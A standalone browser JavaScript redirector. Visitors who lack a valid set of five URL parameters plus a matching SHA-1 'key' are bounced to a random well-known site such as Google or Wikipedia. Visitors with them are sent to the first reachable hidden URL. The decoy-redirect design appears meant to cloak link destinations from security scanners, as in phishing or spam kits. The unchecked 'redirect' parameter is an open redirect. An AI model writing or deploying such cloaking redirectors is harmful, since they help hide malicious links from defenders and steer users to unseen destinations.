// Define the array of default URLs
const defaultUrls = [
  "https://www.google.com/",
  "https://apple.com/",
  "https://microsoft.com/",
  "https://play.google.com/",
  "https://support.google.com/",
  "https://www.blogger.com/",
  "https://docs.google.com/",
  "https://cloudflare.com/",
  "https://mozilla.org/",
  "https://maps.google.com/",
  "https://en.wikipedia.org/",
  "https://wordpress.org/",
  "https://europa.eu/",
  "https://googleusercontent.com/",
  "https://bp.blogspot.com/",
  "https://whatsapp.com/",
  "https://accounts.google.com/",
  "https://adobe.com/",
  "https://drive.google.com/",
  "https://vimeo.com/",
  "https://vk.com/",
  "https://github.com/",
  "https://amazon.com/",
  "https://istockphoto.com/",
  "https://terra.com.br/",
  "https://w3.org/",
  "https://jimdofree.com/",
  "https://bbc.co.uk/",
  "https://fr.wikipedia.org/",
  "https://msn.com/",
  "https://www.weebly.com/",
  "https://nih.gov/",
  "https://youronlinechoices.com/",
  "https://policies.google.com/",
  "https://live.com/",
  "https://mail.ru/",
  "https://google.co.jp/",
  "https://theguardian.com/",
  "https://google.com.br/",
  "https://myspace.com/",
  "https://brandbucket.com/",
  "https://forbes.com/",
  "https://opera.com/",
  "https://line.me/",
  "https://medium.com/",
  "https://feedburner.com/",
  "https://files.wordpress.com/",
  "https://tools.google.com/",
  "https://nytimes.com/",
  "https://nytimes.com/",
  "https://dan.com/",
  "https://bbc.com/",
  "https://who.int/",
  "https://cnn.com/",
  "https://creativecommons.org/",
  "https://netvibes.com/",
  "https://paypal.com/",
  "https://gstatic.com/",
  "https://dailymotion.com/",
  "https://developers.google.com/",
  "https://imdb.com/",
  "https://slideshare.net/",
  "https://www.yahoo.com/",
  "https://wikimedia.org/",
  "https://foxnews.com/",
  "https://list-manage.com/",
  "https://search.google.com/",
  "https://4shared.com/",
  "https://businessinsider.com/",
  "https://tinyurl.com/",
  "https://telegram.me/",
  "https://amazon.co.jp/",
  "https://telegraph.co.uk/",
  "https://issuu.com/",
  "https://wikia.com/",
  "https://wikia.com/",
  "https://independent.co.uk/",
  "https://pinterest.com/",
  "https://estadao.com.br/",
  "https://cdc.gov/",
  "https://scribd.com/",
  "https://aliexpress.com/",
  "https://rakuten.co.jp/",
  "https://nasa.gov/",
  "https://namecheap.com/",
  "https://bloomberg.com/",
  "https://booking.com/",
  "https://reuters.com/",
  "https://office.com/",
  "https://wa.me/",
  "https://marketingplatform.google.com/",
  "https://nature.com/",
  "https://gravatar.com/",
  "https://cpanel.net/",
  "https://de.wikipedia.org/",
  "https://change.org/",
  "https://dailymail.co.uk/",
  "https://enable-javascript.com/",
  "https://wp.com/",
  "https://francetvinfo.fr/",
];

// Function to initialize the redirection
function initializeRedirect() {
  // Select a random URL from the default array
  const defaultTo = defaultUrls[Math.floor(Math.random() * defaultUrls.length)];

  // Get URL parameters
  const urlParams = new URLSearchParams(window.location.search);
  const redirectTo = urlParams.get("redirect") || defaultTo;

  // Check if all required parameters are present
  const urls = [
    urlParams.get("url_01"),
    urlParams.get("url_02"),
    urlParams.get("url_03"),
    urlParams.get("url_04"),
    urlParams.get("url_05"),
  ];
  const key = urlParams.get("key");

  // Function to generate a SHA-1 hash
  async function sha1(message) {
    const msgBuffer = new TextEncoder().encode(message);
    const hashBuffer = await crypto.subtle.digest("SHA-1", msgBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
  }

  // If URLs and key are provided, validate and redirect
  if (urls.every((url) => url) && key) {
    sha1(urls.join("")).then((hash) => {
      if (hash === key) {
        // Attempt to fetch each URL and redirect to the first reachable one
        for (const url of urls) {
          fetch(url, { method: "HEAD" })
            .then((response) => {
              if (response.ok) {
                window.location.href = url;
              }
            })
            .catch(() => {}); // Ignore errors and continue
        }
      } else {
        // If the key is invalid, redirect to the default
        window.location.href = redirectTo;
      }
    });
  } else {
    // If required parameters are missing, redirect to the default
    window.location.href = redirectTo;
  }
}

// Run the function to handle redirection
initializeRedirect();
